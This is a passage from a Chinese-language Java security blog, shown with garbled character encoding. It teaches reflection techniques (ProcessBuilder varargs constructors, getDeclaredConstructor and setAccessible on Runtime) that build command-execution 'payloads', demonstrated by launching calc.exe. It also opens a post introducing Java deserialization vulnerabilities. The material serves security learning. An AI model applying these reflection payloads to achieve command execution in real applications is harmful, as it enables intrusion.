<p>è¿™é‡Œå¯ä»¥ç›´æ¥ç”¨åå°„ä¸­<code>getMethod</code>æ–¹æ³•è·å–<code>start</code>æ–¹æ³•ï¼Œå°±å¯ä»¥é¿å…è¿™ç§é—®é¢˜ï¼Œç„¶å<code>invoke</code>æ‰§è¡Œï¼Œå› ä¸º<code>start</code>çš„æ˜¯ä¸€ä¸ªæ™®é€šæ–¹æ³•ï¼Œæ‰€ä»¥<code>invoke</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯<code>ProcessBuilder</code>ç±»å®ä¾‹ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>

<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230909151721671.png" alt="image-20230909151721671"></p>
<p>æ‰§è¡Œç»“æœï¼Œ</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230909152513387.png" alt="image-20230909152513387"></p>
<hr>
<h2 id="å¯å˜é•¿å‚æ•°ï¼ˆvarargsï¼‰åœ¨åå°„ä¸­çš„æ„ä¹‰ä¸ä½¿ç”¨"><a href="#å¯å˜é•¿å‚æ•°ï¼ˆvarargsï¼‰åœ¨åå°„ä¸­çš„æ„ä¹‰ä¸ä½¿ç”¨" class="headerlink" title="å¯å˜é•¿å‚æ•°ï¼ˆvarargsï¼‰åœ¨åå°„ä¸­çš„æ„ä¹‰ä¸ä½¿ç”¨"></a>å¯å˜é•¿å‚æ•°ï¼ˆvarargsï¼‰åœ¨åå°„ä¸­çš„æ„ä¹‰ä¸ä½¿ç”¨</h2><p>é‚£ä¹ˆï¼Œå¦‚æœæƒ³è¦ç”¨<code>ProcessBuilder</code>çš„ç¬¬ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œåˆåº”è¯¥æ€ä¹ˆå®ç°åå°„å‘¢ï¼Ÿ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ProcessBuilder</span><span class="params">(String... command)</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ¶‰åŠåˆ°Javaçš„å˜é•¿å‚æ•°äº†ï¼Œå’Œå…¶ä»–è¯­è¨€ä¸€æ ·ï¼ŒJavaä¸­ä¹Ÿæ”¯æŒå¯å˜é•¿å‚æ•°ï¼Œå°±ç®—å½“ä½ åœ¨å®šä¹‰å‡½æ•°æ—¶ï¼Œåœ¨è®¾ç½®å‚æ•°æ—¶ï¼Œä¸ç¡®å®šå‚æ•°çš„ä¸ªæ•°æ—¶ï¼Œå¯ä»¥ç”¨ <code>...</code> æ¥è¡¨ç¤ºè¿™ä¸ªå‡½æ•°çš„å‚æ•°ä¸ªæ•°æ˜¯å¯ä»¥å˜çš„ã€‚å…¶å®å°±æ˜¯å’Œæ•°ç»„å·®ä¸å¤šçš„å«ä¹‰ã€‚</p>
<p>è€Œä¸”å®é™…ä¸Šï¼Œå¯¹äº<code>å˜é•¿å‚æ•°</code>ï¼ŒJavaåœ¨ç¼–è¯‘çš„æ—¶å€™ä¼šç¼–è¯‘æˆä¸€ä¸ª<code>ä¸€ç»´æ•°ç»„</code>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äºå¦‚ä¸‹ä¸¤æ®µä»£ç åœ¨åº•å±‚ä¸Šæ˜¯ä¸€è‡´çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æ— æ³•é‡è½½ï¼Œè§ä¸‹å›¾å¯çŸ¥ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String[] names)</span> &#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String... names)</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230909154214840.png" alt="image-20230909154214840"></p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæœ‰ä¸ªæ•°ç»„ï¼Œæƒ³ä¼ ç»™<code>hello</code>å‡½æ•°ï¼Œç›´æ¥ä¼ å…¥æ•°ç»„å³å¯</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] names = &#123;<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>&#125;;</span><br><span class="line">hello(names);</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å°†å­—ç¬¦ä¸²æ•°ç»„çš„ç±»<code>String[].class</code>ä¼ ç»™<code>getConstructor</code>ï¼Œå°±å¯ä»¥æŸ¥æ‰¾è·å–<code>ProcessBuilder</code>çš„ç¬¬äºŒç§æ„é€ å‡½æ•°ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">clazz</span> = Class.forName(<span class="string">&quot;java.lang.ProcessBulider&quot;</span>);</span><br><span class="line">clazz.getConstructor(String[].class);</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯åœ¨é€šè¿‡<code>newInstance</code>ä¼ å‚æ—¶ï¼Œå°±æœ‰ä¸åŒäº†ï¼Œå› ä¸º<code>ProcessBulider</code>çš„ç¬¬ä¸€ä¸ªæ„é€ å‡½æ•°çš„å‚æ•°æ˜¯å˜é•¿å‚æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç»´æ•°ç»„ï¼Œè€Œ<code>newInstance</code>çš„å‚æ•°ä¹Ÿæ˜¯å˜é•¿å‚æ•°ï¼ŒåŒæ ·ä¹Ÿæ˜¯ä¸€ç»´æ•°ç»„ï¼Œå¦‚ä¸‹å›¾ï¼Œæ‰€ä»¥æƒ³é€šè¿‡å¦‚æœæƒ³ä¼ å‚æˆåŠŸï¼Œå°±æ˜¯ä¸€ä¸ªä¸€ç»´æ•°ç»„ä¸­å…ƒç´ ä¸ºä¸€ç»´æ•°ç»„ &#x3D;&#x3D;&gt; ä¹Ÿå°±æ˜¯äºŒç»´æ•°ç»„ã€‚</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230909220933269.png" alt="image-20230909220933269"></p>
<p>äºæ˜¯æ„é€ payloadå¦‚ä¸‹ï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">       ((ProcessBuilder) clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬æƒ³è¦ä¼ ç»™æ„é€ å‡½æ•°çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç»´æ•°ç»„ï¼Œå°±è¢«å½“ä½œä¼ ç»™<code>newInstance</code>çš„äºŒç»´æ•°ç»„çš„å…ƒç´ å½¢å¼ï¼Œä¼ ç»™äº†æ„é€ å‡½æ•°ã€‚</p>
<p>è¿™é‡Œå¯èƒ½ä¼šäº§ç”Ÿä¸€ä¸ªç–‘æƒ‘ï¼Œä¸æ˜¯<code>newInstance</code>ä¹Ÿæ˜¯æ¥æ”¶ä¸€ä¸ªä¸€ç»´æ•°ç»„å—ï¼Œä¸ºä»€ä¹ˆè¿™é‡Œå¯ä»¥æ˜¯äºŒç»´æ•°ç»„ï¼Œä½†æ˜¯å®é™…ä¸Šè¿™é‡Œçš„äºŒç»´æ•°ç»„èµ·çš„ä½œç”¨ä¹Ÿåªæ˜¯ä¸€ä¸ªä¸€ç»´æ•°ç»„ï¼Œå› ä¸ºå®ƒçš„å…ƒç´ åªèƒ½æœ‰ä¸€ä¸ªä¸€ç»´æ•°ç»„ã€‚</p>
<p>å¦‚ä¸‹ï¼Œå°†äºŒç»´æ•°ç»„ä¸­åŠ å…¥ä¸¤ä¸ªä¸€ç»´æ•°ç»„å…ƒç´ åï¼Œå‘ç”ŸæŠ¥é”™ï¼ŒæœŸå¾…çš„å‚æ•°åªæœ‰ä¸€ä¸ªï¼Œä½†æ˜¯å´ä¼ å…¥äº†ä¸¤ä¸ªï¼Œè¯´æ˜è¿™é‡Œ<code>æœ¬è´¨è¿˜æ˜¯éœ€è¦ä¸€ä¸ªä¸€ç»´æ•°ç»„</code>ã€‚</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910012544167.png" alt="image-20230910012544167"></p>
<p>é‚£å¦‚æœåªåœ¨<code>newIntance</code>ä¸­ä¼ å…¥ä¸€ä¸ªä¸€ç»´æ•°ç»„å‘¢ï¼Ÿå¯ä»¥çœ‹åˆ°å¦‚æœç›´æ¥å°†ä¸€ä¸ªä¸€ç»´æ•°ç»„å½“ä½œå‚æ•°ä¼ å…¥ï¼Œ<code>newInstance</code>å°±ä¼šå½“ä½œä¼ å…¥çš„ä¸‰ä¸ªå…ƒç´ ã€<code>&quot;1&quot;,&quot;2&quot;,&quot;3&quot;</code>ã€‘éƒ½æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä¹Ÿå°±æ˜¯å½“ä½œä¼ å…¥äº†ä¸‰ä¸ªæ•°ç»„ï¼Œè€Œæ²¡æœ‰æŠŠæ•´ä¸ªæ•°ç»„å½“ä½œä¸€ä¸ªå¯¹è±¡å‘é€ç»™æ„é€ å‡½æ•°ä¸­å»ã€‚</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910142343462.png" alt="image-20230910142343462"></p>
<p>è€Œ<code>newInstance</code>éœ€è¦çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ç±»å‹çš„å˜é•¿å‚æ•°ï¼Œæ‰€ä»¥åªéœ€è¦å¼ºç±»å‹è½¬æ¢å°†æˆ‘ä»¬ä¼ å…¥çš„æ•°ç»„æ•´ä½“å½“ä½œä¸€ä¸ªå¯¹è±¡ç±»å‹å°±è¡Œã€‚</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910142657430.png" alt="image-20230910142657430"></p>
<p>å¯ä»¥çœ‹åˆ°æˆåŠŸè¿è¡Œï¼Œä¸è¿‡ä¸€èˆ¬æƒ…å†µæ˜¯ç”¨ä¸äº†å¼ºç±»å‹è½¬æ¢çš„ï¼Œåªèƒ½ç”¨åå°„ä¹‹ç±»çš„æ–¹æ³•ã€‚</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910142957441.png" alt="image-20230910142957441"></p>
<p>é‚£ä¸ºä»€ä¹ˆä¼ å…¥äºŒç»´æ•°ç»„çš„æ—¶å€™ä¸ç”¨å¼ºç±»å‹è½¬æ¢å‘¢ï¼Ÿ</p>
<p>è™½ç„¶ä¼ å…¥çš„æ˜¯äºŒç»´æ•°ç»„ï¼Œä½†å®é™…çœŸæ­£çš„å¯¹è±¡æ˜¯å…¶å…ƒç´ ï¼Œä¹Ÿå°±æ˜¯ä¸€ç»´æ•°ç»„ï¼Œæ‰€ä»¥å¦‚æœç›´æ¥å¼ºç±»å‹æŠŠäºŒç»´æ•°ç»„ä¹Ÿå½“åšå¯¹è±¡ä¼ ç»™<code>newIntance</code>åè€Œä¼šæŠ¥é”™ï¼Œ<code>newIntance</code>å‚æ•°ç±»å‹ä¸åŒ¹é…ï¼Œå› ä¸º<code>newIntrance</code>æœŸå¾…çš„ä¹Ÿæ˜¯ä¸€ä¸ªä¸€ç»´æ•°ç»„ï¼Œä¹Ÿå°±æ˜¯èµ·ä½œç”¨çš„åªæ˜¯äºŒç»´æ•°ç»„ä¸­é‚£ä¸€ä¸ªä¸€ç»´æ•°ç»„ã€‚</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910144957733.png" alt="image-20230910144957733"></p>
<p>æ ¹æ®pç¥å»ºè®®å°†<code>payload</code>æ”¹æˆå…¨åå°„æ–¹æ³•ï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;));</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œ</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910155334300.png" alt="image-20230910155334300"></p>
<h2 id="getDeclared"><a href="#getDeclared" class="headerlink" title="getDeclared"></a>getDeclared</h2><p>è¿™é‡Œå°±æ˜¯è§£å†³ç¬¬äºŒä¸ªé—®é¢˜</p>
<blockquote>
<p>å¦‚æœä¸€ä¸ªæ–¹æ³•æˆ–æ„é€ æ–¹æ³•æ˜¯ç§æœ‰æ–¹æ³•ï¼Œæˆ‘ä»¬æ˜¯å¦èƒ½æ‰§è¡Œå®ƒå‘¢ï¼Ÿ</p>
</blockquote>
<p>è¿™é‡Œå°±å¼•å…¥äº†ä¸€ä¸ª<code>getDeclared</code>ç³»åˆ—çš„åå°„ï¼Œå’Œ<code>getMethod</code>ã€<code>getConstructor</code>åŒºåˆ«åœ¨äº</p>
<ul>
<li><code>getMethod</code>ç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­æ‰€æœ‰çš„å…¬å…±æ–¹æ³•ï¼ŒåŒ…æ‹¬ä»çˆ¶ç±»ç»§æ‰¿çš„æ–¹æ³•</li>
<li><code>getDeclared</code>ç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­<code>å£°æ˜</code>çš„æ–¹æ³•ï¼ŒåŒ…æ‹¬ç§æœ‰æ–¹æ³•ï¼Œä½†æ˜¯æ˜¯å¿…é¡»å†™åœ¨ç±»ä¸­çš„ï¼Œå¦‚æœæ˜¯ä»çˆ¶ç±»ç»§æ‰¿è€Œæ¥çš„å°±ä¸åŒ…å«äº†ã€‚</li>
</ul>
<p>å…¶ä¸­<code>getDeclaredMethod</code>å’Œ<code>getDeclaredConstructor</code>çš„å…·ä½“ç”¨æ³•ï¼Œä¸<code>getMethod</code>å’Œ<code>getConstructor</code>ç±»ä¼¼ï¼ŒåŒºåˆ«å¦‚ä¸Šæ‰€è¿°ã€‚</p>
<p>åœ¨æ­¤ç¬¬äºŒç¯‡è®²è¿‡ï¼Œ<code>Runtime</code>çš„æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ï¼Œæ˜¯é€šè¿‡é™æ€æ–¹æ³•<code>Runtime.getRuntime()</code>è·å–å…¶è¿è¡Œå®ä¾‹ç°åœ¨äº†è§£äº†<code>getDeclaredConstructor</code>ï¼Œå°±å¯ä»¥é€šè¿‡è¿™ä¸ªè·å–<code>Runtime</code>çš„ç§æœ‰çš„æ„é€ æ–¹æ³•æ¥å®ä¾‹åŒ–å¯¹è±¡ï¼Œè¿›è€Œæ‰§è¡Œå‘½ä»¤ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(clazz.getDeclaredConstructor().newInstance(), <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±æ˜¯å°†</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">xx.invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="literal">null</span>), <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>æ›¿æ¢ä¸º</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">xx.invoke(clazz.getDeclaredConstructor().newInstance(), <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="setAccessible"><a href="#setAccessible" class="headerlink" title="setAccessible"></a>setAccessible</h2><p>è¿è¡Œå‘ç”ŸæŠ¥é”™ï¼Œ</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910172547619.png" alt="image-20230910172547619"></p>
<blockquote>
<p>è¿™é‡ŒæŠ¥é”™åœ¨pç¥çš„æ–‡ç« ä¸­è¯´åˆ°ï¼Œè¿™é‡Œå¿…é¡»è¦ä½¿ç”¨ä¸€ä¸ªæ–¹æ³•<code>setAccessible</code>ï¼Œåœ¨è·å–åˆ°äº†ä¸€ä¸ªç§æœ‰æ–¹æ³•åï¼Œå¿…é¡»ç”¨<code>setAccessible</code>ä¿®æ”¹å™¨ä½œç”¨åŸŸï¼Œå¦åˆ™ä»ç„¶ä¸èƒ½è°ƒç”¨ã€‚</p>
</blockquote>
<p>æ‰€æœ‰åœ¨è¿™é‡Œå°±æŠ¥é”™æé†’<code>Runtime</code>æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„æ— æ³•è·å–ï¼Œåªéœ€è¦è®¾ç½®<code>setAccessible</code>ä¸º<code>true</code>å³å¯æ‹¥æœ‰è®¿é—®åŸŸã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Runtime_Getdeclared</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿˜æ˜¯æŠ¥é”™ï¼Œ</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910174535081.png" alt="image-20230910174535081"></p>
<p>é—®äº†AIæ‰çŸ¥é“ï¼Œ</p>
<blockquote>
<p>è¿™ä¸ªé”™è¯¯æ˜¯å› ä¸ºJava 9å¼•å…¥çš„æ¨¡å—ç³»ç»Ÿã€‚åœ¨æ¨¡å—åŒ–Javaåº”ç”¨ç¨‹åºä¸­ï¼Œä¸€ä¸ªæ¨¡å—åªèƒ½è®¿é—®åˆ°å®ƒæ˜ç¡®æ‰“å¼€ç»™å…¶ä»–æ¨¡å—çš„åŒ…ã€‚åœ¨ä½ çš„æƒ…å†µä¸‹ï¼Œ<code>java.lang</code>åŒ…æ²¡æœ‰è¢«æ‰“å¼€ç»™ä½ çš„æ¨¡å—ï¼Œæ‰€ä»¥ä½ ä¸èƒ½è®¿é—®å®ƒçš„ç§æœ‰æˆå‘˜</p>
<p>ä»<code>Java 9</code>å¼€å§‹ï¼Œ<code>setAccessible(true)</code>ä¸å†æ€»æ˜¯èƒ½æˆåŠŸåœ°ä½¿å¾—ç§æœ‰æˆå‘˜å¯è®¿é—®ã€‚å¦‚æœä¸€ä¸ªåŒ…æ²¡æœ‰è¢«æ‰“å¼€ç»™ä½ çš„æ¨¡å—ï¼Œé‚£ä¹ˆå°è¯•è®¿é—®å®ƒçš„ç§æœ‰æˆå‘˜å°†ä¼šæŠ›å‡º<code>InaccessibleObjectException</code></p>
</blockquote>
<p>æ­£å¥½æœ‰ä¸ª<code>Java8</code>ï¼Œè¯•è¯•æ”¹ä¸€ä¸‹ç¼–è¯‘å™¨ç¯å¢ƒå˜é‡å†è·‘ä¸€ä¸‹</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910205325205.png" alt="image-20230910205325205"></p>
<p>å¯èƒ½ä¼šæŠ¥é”™ï¼Œè¿™æ˜¯å› ä¸ºè¿™ä¸ªé¡¹ç›®æˆ‘ä»¬å·²ç»ç”¨é«˜ç‰ˆæœ¬çš„<code>JDK</code>ç¼–è¯‘è¿‡ä¸€æ¬¡äº†ï¼Œè€Œé«˜ç‰ˆæœ¬èƒ½å…¼å®¹ä½ç‰ˆæœ¬çš„ï¼Œä½†æ˜¯ä½ç‰ˆæœ¬å°±æ— æ³•è¿è¡Œé«˜ç‰ˆæœ¬çš„ï¼Œæ‰€ä»¥ä¼šæŠ¥é”™</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910213830868.png" alt="image-20230910213830868"></p>
<blockquote>
<p><a href="https://blog.csdn.net/superit401/article/details/72731381">https://blog.csdn.net/superit401/article/details/72731381</a></p>
</blockquote>
<p>äºæ˜¯ç›´æ¥å†™ä¸ª<code>txt</code>è·‘<code>Java8</code></p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910220848024.png" alt="image-20230910220848024"></p>
<p>å‘ç°è¿è¡ŒæˆåŠŸï¼Œå½“ç„¶è™½ç„¶æ˜¯ä½ç‰ˆæœ¬ï¼Œä½†æ˜¯<code>setAccessible</code>è¿˜æ˜¯å¿…é¡»å­˜åœ¨çš„ï¼Œ</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910221035690.png" alt="image-20230910221035690"></p>
]]></content>
      <categories>
        <category>Javaæ¼«è°ˆå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaå®‰å…¨[ååºåˆ—åŒ–(1)]</title>
    <url>//post/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)%5D/</url>
    <content><![CDATA[<p>ç»ˆäºå¼€å§‹ååºåˆ—åŒ–å¼€ç¯‡ï¼Œä¹‹å‰å†RMIçš„æ”»å‡»å’Œæµç¨‹ä¸­å‘ç°ï¼Œå¤§å¤šæ•°çš„æ•°æ®å‘é€å’Œæ¥æ”¶éƒ½æ˜¯ååºåˆ—åŒ–æ•°æ®ã€‚</p>
<blockquote>
<p>é‚£ä¹ˆï¼Œä¸ºä»€ä¹ˆååºåˆ—åŒ–å¸¸å¸¸ä¼šå¸¦æ¥å®‰å…¨éšæ‚£ï¼Ÿ </p>
<p>ä¸€é—¨æˆç†Ÿçš„è¯­è¨€ï¼Œå¦‚æœéœ€è¦åœ¨ç½‘ç»œä¸Šä¼ é€’ä¿¡æ¯ï¼Œé€šå¸¸ä¼šç”¨åˆ°ä¸€äº›æ ¼å¼åŒ–æ•°æ®ï¼Œ</p>
<p>æ¯”å¦‚ï¼š </p>
<ul>
<li>JSON </li>
<li>XML</li>
</ul>
<p>ä½†è¿™ä¸¤ä¸ªæ•°æ®æ ¼å¼éƒ½æœ‰ä¸€ä¸ªå…± åŒçš„é—®é¢˜ï¼šä¸æ”¯æŒå¤æ‚çš„æ•°æ®ç±»å‹ã€‚ å¤§å¤šæ•°å¤„ç†æ–¹æ³•ä¸­ï¼ŒJSONå’ŒXMLæ”¯æŒçš„æ•°æ®ç±»å‹å°±æ˜¯åŸºæœ¬æ•°æ®ç±»å‹ï¼Œæ•´å‹ã€æµ®ç‚¹å‹ã€å­—ç¬¦ä¸²ã€å¸ƒå°” ç­‰ï¼Œå¦‚æœå¼€å‘è€…å¸Œæœ›åœ¨ä¼ è¾“æ•°æ®çš„æ—¶å€™ç›´æ¥ä¼ è¾“ä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆå°±ä¸å¾—ä¸æƒ³åŠæ³•æ‰©å±•åŸºç¡€çš„ JSONï¼ˆXMLï¼‰è¯­æ³•ã€‚ </p>
<p>æ¯”å¦‚ï¼ŒJacksonå’ŒFastjsonè¿™ç±»åºåˆ—åŒ–åº“ï¼Œåœ¨JSONï¼ˆXMLï¼‰çš„åŸºç¡€ä¸Šè¿›è¡Œæ”¹é€ ï¼Œé€šè¿‡ç‰¹å®šçš„è¯­æ³•æ¥ä¼ é€’å¯¹è±¡ï¼›äº¦æˆ–è€…å¦‚RMIï¼Œç›´æ¥ä½¿ç”¨Javaç­‰è¯­è¨€å†…ç½®çš„åºåˆ—åŒ–æ–¹æ³•ï¼Œå°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸²äºŒè¿›åˆ¶æ•°æ®è¿›è¡Œ ä¼ è¾“ã€‚</p>
<p>ä¸ç®¡æ˜¯Jacksonã€Fastjsonè¿˜æ˜¯ç¼–ç¨‹è¯­è¨€å†…ç½®çš„åºåˆ—åŒ–æ–¹æ³•ï¼Œä¸€æ—¦æ¶‰åŠåˆ°åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ•°æ®ï¼Œå°±å¯ èƒ½ä¼šæ¶‰åŠåˆ°å®‰å…¨é—®é¢˜ã€‚ä½†é¦–å…ˆè¦ç†è§£çš„æ˜¯ï¼Œâ€œååºåˆ—åŒ–æ¼æ´â€æ˜¯å¯¹ä¸€ç±»æ¼æ´çš„æ³›æŒ‡ï¼Œè€Œä¸æ˜¯ä¸“æŒ‡æŸç§ååº åˆ—åŒ–æ–¹æ³•å¯¼è‡´çš„æ¼æ´ï¼Œæ¯”å¦‚Jacksonååºåˆ—åŒ–æ¼æ´å’ŒJava readObjecté€ æˆçš„ååºåˆ—åŒ–æ¼æ´å°±æ˜¯å®Œå…¨ä¸åŒ çš„ä¸¤ç§æ¼æ´ã€‚ </p>
</blockquote>
<p>æˆ‘ä»¬å…ˆæ¥è¯´è¯´Javaå†…ç½®çš„åºåˆ—åŒ–æ–¹æ³•<code>readObject</code>ï¼Œå’Œå…¶æœ‰å…³çš„æ¼æ´</p>
<span id="more"></span>

<h1 id="Javaå®‰å…¨-ååºåˆ—åŒ–-1"><a href="#Javaå®‰å…¨-ååºåˆ—åŒ–-1" class="headerlink" title="Javaå®‰å…¨[ååºåˆ—åŒ–(1)]"></a>Javaå®‰å…¨[ååºåˆ—åŒ–(1)]</h1><h2 id="ååºåˆ—åŒ–æ–¹æ³•çš„å¯¹æ¯”"><a href="#ååºåˆ—åŒ–æ–¹æ³•çš„å¯¹æ¯”" class="headerlink" title="ååºåˆ—åŒ–æ–¹æ³•çš„å¯¹æ¯”"></a>ååºåˆ—åŒ–æ–¹æ³•çš„å¯¹æ¯”</h2><p>è¯´åˆ°ååºåˆ—åŒ–ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„å°±æ˜¯phpååºåˆ—åŒ–å’Œpythonååºåˆ—åŒ–ã€‚</p>
<p>å…¶ä¸­Javaååºåˆ—åŒ–ä¸phpååºåˆ—åŒ–æœ‰ç±»ä¼¼ä¹‹å¤„ï¼Œä»–ä»¬éƒ½åªèƒ½å°†ä¸€ä¸ªå¯¹è±¡ä¸­çš„å±æ€§æŒ‰ç…§æŸç§ç‰¹å®šçš„æ ¼å¼ç”Ÿæˆä¸€æ®µæ•°æ®æµï¼Œååºåˆ—åŒ–æ—¶å†æŒ‰ç…§åºåˆ—åŒ–çš„æ ¼å¼é¡ºåºï¼Œå°†å±æ€§æ‹¿å›æ¥é‡æ–°èµ‹å€¼ç»™æ–°çš„å¯¹è±¡ã€‚</p>
<p>ä½†æ˜¯ä¸¤è€…åŒºåˆ«åœ¨äºï¼ŒJavaååºåˆ—åŒ–æ›´åŠ æ·±å…¥ï¼Œå®ƒæä¾›äº†æ›´åŠ é«˜çº§ã€çµæ´»çš„æ–¹æ³•<code>wirteObject</code>ï¼Œ</p>
<blockquote>
<p>å…è®¸å¼€å‘è€…åœ¨åºåˆ—åŒ–æµä¸­æ’å…¥ä¸€äº›è‡ªå®šä¹‰æ•°æ®ï¼Œè¿›è€Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™èƒ½å¤Ÿä½¿ç”¨ <code>readObject</code> è¿›è¡Œè¯»å–ã€‚</p>
</blockquote>
<p>è€Œphpä¸­æœ‰ä¸ªé­”æœ¯æ–¹æ³•å«åš<code>__wakeup</code>ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è¿›è¡Œè§¦å‘ã€‚è™½ç„¶Javaçš„<code>readObject</code>ä¹Ÿæ˜¯åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è§¦å‘çš„ï¼Œä½†æ˜¯ä¸¤è€…å¤„ç†çš„é—®é¢˜è¿˜æ˜¯æœ‰æ‰€ä¸åŒçš„ã€‚</p>
<ul>
